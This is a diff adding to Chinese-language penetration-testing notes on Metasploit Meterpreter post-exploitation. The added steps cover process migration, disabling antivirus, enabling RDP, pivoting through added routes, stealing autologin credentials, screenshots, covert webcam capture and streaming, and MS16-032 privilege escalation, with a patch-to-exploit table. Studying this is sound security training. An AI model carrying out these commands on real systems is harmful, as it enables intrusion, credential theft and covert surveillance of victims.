@@ -3257,7 +3257,7 @@ set payloads cmd/unix/reverse
 
 
 
-### 后渗透攻击工作
+### 后渗透攻击工作&准备
 
 对成功渗透进的主机，我们可以使用**Metasploit**提供的**Meterpreter**工具，使后续的渗透入侵变得更容易。后期渗透模块有200多个，Meterpreter有以下优势
 
@@ -3277,6 +3277,394 @@ set payloads cmd/unix/reverse
 **首先 `ps` 查看目标主机有哪些进程**
 
 ![image-20210318125104109](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318125104109.png)
+
+![image-20210318153005750](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318153005750.png)
+
+再输入 `getpid` 命令查看 Meterpreter Shell的进程号
+
+![image-20210318152713337](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318152713337.png)
+
+总结一下，进程PID：1052；Name：spoolsv.exe。输入migarte 2828命令，吧shell移动到2828的svchost.exe进程里（这里需要选择一个稳定的程序进行转移）
+
+```
+migrate 2828
+```
+
+迁移之后会自动杀除原先PID，如果没有就kill它
+
+```
+kill 1052
+```
+
+自动迁移到其他进程
+
+```
+run post/windows/manage/migrate
+```
+
+![image-20210318154343906](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318154343906.png)
+
+
+
+#### 系统命令
+
+##### 查看目标的系统信息
+
+```
+sysinfo
+```
+
+![image-20210318155701108](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318155701108.png)
+
+
+
+##### 查看目标机是否在虚拟机上
+
+```
+run post/windows/gather/checkvm
+```
+
+![image-20210318155742231](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318155742231.png)
+
+
+
+##### 查看运行时间
+
+```
+idletime
+```
+
+![image-20210318155848538](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318155848538.png)
+
+
+
+##### 查看目标机的路由
+
+```
+route
+```
+
+![image-20210318155944041](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318155944041.png)
+
+
+
+##### 隐藏后台
+
+想在 MSF 终端中执行其他任务，可以使用 `background` 命令将 Meterpreter 终端隐藏在后台
+
+```
+background
+```
+
+Metasploit 的 `session`命令可以查看已经成功获取的会话，如果想继续与某会话进行交互，可以使用 `session -i`命令，最后用 `session -k`命令杀死
+
+```
+sessions
+sessions -i
+sessions -k
+```
+
+![image-20210318160512439](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318160512439.png)
+
+
+
+##### 查看目标机器已经渗透成功的用户名
+
+```
+getuid
+```
+
+
+
+##### 关闭杀毒软件
+
+```
+run post/windows/manage/killav
+```
+
+![image-20210318160830939](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318160830939.png)
+
+
+
+##### 开启远程桌面
+
+```
+run post/windows/manage/enable_rdp
+```
+
+可以看到我们已经开启的远程桌面（3389）
+
+![image-20210318161000359](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318161000359.png)
+
+
+
+##### 查看本地的网络情况
+
+```
+run post/multi/manage/autoroute
+```
+
+![image-20210318161251734](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318161251734.png)
+
+
+
+##### 添加路由
+
+background命令先隐藏后台，`route add` 添加路由，添加成功后输入 `route print` 查看
+
+```
+route add
+route print
+```
+
+可以看到我们已将一条地址为192.168.172.0 路由添加进攻陷主机的的路由表中，然后就可以**借用被攻陷的主机对其他网络进行攻击**
+
+![image-20210318161751467](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318161751467.png)
+
+
+
+##### 查看有多少用户登录了目标机
+
+```
+run post/windows/gather/enum_logged_on_users
+```
+
+![image-20210318162404847](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318162404847.png)
+
+
+
+##### 查看目标机的应用程序
+
+```
+run post/windows/gather/enum_applications
+```
+
+![image-20210318162728835](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318162728835.png)
+
+
+
+##### 抓取自动登录的用户名和密码
+
+```
+run windows/gather/credentials/windows_autologin
+```
+
+![image-20210318163103995](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318163103995.png)
+
+
+
+##### 抓取屏幕截图
+
+需要用到扩展插件：Espia，使用前先要加载该插件再截图桌面
+
+```
+load espia
+screengrab 或者 screenshot
+```
+
+系统会告诉保存截图的地址
+
+![image-20210318173649899](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318173649899.png)
+
+
+
+##### 查看摄像头
+
+1. **查看目标有没有摄像头**
+
+   ```
+   webcam_list
+   ```
+
+   ![image-20210318174033652](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318174033652.png)
+
+2. **调用摄像头拍照**
+
+   ```
+   webcam_snap
+   ```
+
+   ![image-20210318174045354](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318174045354.png)
+
+3. **开启摄像头的直播模式**
+
+   ```
+   webcam_stream
+   ```
+
+   这里系统会给一个地址，打开这个地址就可以看直播了
+
+   ![image-20210318174433593](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318174433593.png)
+
+   ![image-20210318174649477](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318174649477.png)
+
+
+
+##### 进入目标机Shell
+
+直接 `shell` 命令进入目标机，`exit` 退出
+
+```
+shell
+exit
+```
+
+**chcp命令解决中文乱码**
+
+这种方式只能用来临时解决部分中文乱码问题，可以正常显示英文，但不能显示中文
+
+```
+chcp 65001
+```
+
+
+
+#### 文件系统命令
+
+| 命令                         | 作用                                                         |
+| ---------------------------- | ------------------------------------------------------------ |
+| pwd/getwd                    | 当前目录                                                     |
+| getlwd                       | 获取本地目录                                                 |
+| ls                           | 当前目录下的文件                                             |
+| cd                           | 切换目录                                                     |
+| search -f*.txt-d c: \:       | 搜索C盘下所有“.txt”为扩展名的文件，`-f` 用于指定搜索文件模式，`-d` 指定那个目录下搜索 |
+| download c:\test.txt /root   | 下载目标主机C盘下的test.txt，到攻击机的root目录下            |
+| upload /root/test.txt  c: \: | 上传攻击机的root目录下test.txt，到目标主机C盘下              |
+
+
+
+### 后渗透攻击：权限提升
+
+为了可以控制更多的设备或者拿取更多的资料，我们需要将自己的访问级别从Guset提升到User，再到Administrator，最后到System级别。
+
+渗透的最终目的就是拿到服务器的最高权限，提升权限的方式分为以下两类。
+
+- 纵向提权：低权限角色获得高权限角色的权限
+
+  这种也叫做权限提升
+
+- 横向提权：获取同级別角色的权限
+
+  通过已经攻破的系统A获取了系统B的权限，那么这种提权就属于横向提权。
+
+
+
+#### 查看自己的权限
+
+```
+whoami/groups
+```
+
+![image-20210318182357807](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318182357807.png)
+
+
+
+#### 利用WMIC实战MS16-032本地溢出漏洞
+
+假设此处我们通过一系列的渗透测试得到了目标机器的 Meterpreter Shell，首先输入 `getuid` 命令査看已经获得的权限，可以看到现在的权限很低，是test权限。尝试輸入 `geosystem` 命令提权
+
+```
+getsystem
+```
+
+如果失败了可以查看系统已打的补丁，shell到CMD下用该命令，或者查看C:\windows\里留下的补丁号 ".log" 查看大概打了哪些补丁
+
+```
+shell
+systeminfo
+```
+
+![image-20210318193055501](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318193055501.png)
+
+我们再用 `WMIC`  命令列出已安装的补丁
+
+```
+wmic qfe get
+```
+
+![image-20210318193356992](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318193356992.png)
+
+
+
+关于漏洞信息的分析可以参考下面两个网站
+
+> - 安全焦点，https://www.securityfocus.com/
+> - Exploit-DB，http://www.exploit-db.com
+
+
+
+**知识点：**WMIC是 Windows Management Instrumentation Command line的简称，它是一款**命令行管理工具**，不仅可以管理本地计算机，还可以管理同一域内的所有远程计算机（需要必要的权限），而被管理的远程计算机不必事先安装WMIC
+
+wmic.exe位于Windows目录下，是一个命令行程序，WMIC可以以两种模式
+
+- **交互模式：**毎当一个命令执行完毕后，系统都会返回到MIC提示符下如"Root\cli"，交互模式通常在需要执行多个WMIC指令时使用，有时还会对一些敏感的操作要求确认，例如删除操作，这样能最大限度地防止用户操作出现失误。
+- **非交互模式：**非交互模式是指将WMIC指令直接作为WMIC的参数放在WMIC后面，当指令执行完毕后再返回到普通的命令提示符下，而不是进入WMIC上下文环境中。WMIC的非交互模式主要用于批处理或者其他一些脚本文件中。
+
+> 需要注意的是，在Windows XP下，低权限用户是不能使用WMIC命令的，但是在 Windows7系统和 Windows8系统下，低权限用户可以使用WMIC，且不用更改任何设置。
+
+
+
+WMIC在信息收集和后渗透测试阶段非常实用，可以调取查看目标机的进程服务、用户、用户组、网络连接、硬盘信息、网络共享信息、已安装补丁、启动项、已安装的软件、操作系统的相关信息和时区等。
+接下来准备提权，同样需要先把 Meterpreter会话转为后台执行，然后搜索MS16-032
+
+![image-20210318195340707](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318195340707.png)
+
+这里使用这个，再指定 session 为 1 进行提权操作（这个就是设置我们刚刚进去的地方）
+
+![image-20210318195504056](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318195504056.png)
+
+这样可以进行提权操作了！现在我们就是SYSTEM级权限了！
+
+![image-20210318200218863](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318200218863.png)
+
+
+
+#### 部分系统对应补丁号
+
+| **Win2003**                                                  | **Win2008**                                                  | **Win2012**                                                  |
+| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
+| KB2360937\|MS10-084 KB2478960\|MS11-014 KB2507938\|MS11-056 KB2566454\|MS11-062 KB2646524\|MS12-003 KB2645640\|MS12-009 KB2641653\|MS12-018 KB944653\|MS07-067 KB952004\|MS09-012 PR KB971657\|MS09-041 KB2620712\|MS11-097 KB2393802\|MS11-011 KB942831\|MS08-005 KB2503665\|MS11-046 KB2592799\|MS11-080 KB956572\|MS09-012烤肉 KB2621440\|MS12-020 KB977165\|MS10-015Ms Viru KB3139914\|MS16-032 KB3124280\|MS16-016 KB3134228\|MS16-014 KB3079904\|MS15-097 KB3077657\|MS15-077 KB3045171\|MS15-051 KB3000061\|MS14-058 KB2829361\|MS13-046 KB2850851\|MS13-053EPATHOBJ 0day 限32位 KB2707511\|MS12-042 sysret -pid KB2124261\|KB2271195 MS10-065 IIS7 KB970483\|MS09-020IIS6 | KB3139914\|MS16-032 KB3124280\|MS16-016 KB3134228\|MS16-014 KB3079904\|MS15-097 KB3077657\|MS15-077 KB3045171\|MS15-051 KB3000061\|MS14-058 KB2829361\|MS13-046 KB2850851\|MS13-053EPATHOBJ 0day 限32位 KB2707511\|MS12-042 sysret -pid KB2124261\|KB2271195 MS10-065 IIS7 KB970483\|MS09-020IIS6 | KB3139914\|MS16-032 KB3124280\|MS16-016 KB3134228\|MS16-014 KB3079904\|MS15-097 KB3077657\|MS15-077 KB3045171\|MS15-051 KB3000061\|MS14-058 KB2829361\|MS13-046 KB2850851\|MS13-053EPATHOBJ 0day 限32位 KB2707511\|MS12-042 sysret -pid KB2124261\|KB2271195 MS10-065 IIS7 KB970483\|MS09-020IIS |
+
+
+
+
+
+#### 令牌窃取
+
+##### 令牌窃取原理
+
+令牌（Token）就是系统的临时密钥，相当于账户名和密码，用来判断这次请求的所属用户。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源。除非系统重新启动令牌才会丢失。令牌最大的特点就是随机性，不可预测。
+
+令牌的类型：
+
+- 访问令牌( Access Token）：表示访问控制操作主题的系统对象
+- 密保令牌（Security token）：又叫作认证令牌或者硬件令牌，是一种计算机身份校验的物理设备，例如U盾
+- 会话令牌（Session Token）：是交互会话中唯一的身份标识符。
+
+在假冒令牌攻击中需要使用**Kerberos协议**。所以在使用假冒令牌前，我们要知道Kerberos协议！
+
+
+
+##### Kerberos协议
+
+Kerberos协议用于为客户提供认证服务
+
+![image-20210318203117141](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210318203117141.png)
+
+**服务过程**
+
+1. 客户端向认证服务器(AS)发送请求，要求得到服务器的证书
+2. AS收到请求后，将包含客户端密钥的加密证书响应发送给客户端。该证书包括服务器 ticket（包括服务器密钥加密的客户机身份和份会话密钥）和一个临时加密密钥(又称为会话密钥， session key)。当然，认证服务器也会给服务器发送一份该证书，用来使服务器认证登录客户端的身份
+3. 客户端将ticket传送到服务器上，服务器确认该客户端的话，便允许它登录服务器。
+4. 客户端登录成功后，攻击者就可以通过入侵服务器获取客户端的令牌。
+
+
+
+##### 假冒令牌的实战
+
+
+
+
 
 
 
